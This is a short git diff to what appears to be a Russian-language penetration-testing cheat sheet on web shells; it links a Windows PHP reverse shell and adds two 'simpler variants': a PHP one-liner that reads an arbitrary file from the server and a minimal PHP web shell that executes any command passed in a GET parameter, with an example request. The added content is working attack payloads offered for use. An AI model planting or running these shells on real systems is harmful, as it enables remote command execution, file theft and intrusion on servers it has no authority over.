@@ -6,6 +6,21 @@ wso web shell - 1page php script с файловым менеджером
 
 PHP Win rev shell: [https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)
 
+Варианты попроще
+
+### File read
+
+```php
+<?php echo file_get_contents('/path/to/target/file'); ?>
+```
+
+### Command execution
+
+```php
+<?php echo system($_GET['command']); ?>
+// GET /example/exploit.php?command=id HTTP/1.1
+```
+
 ## ASP.NET
 
 Основа (.asmx, .aspx)
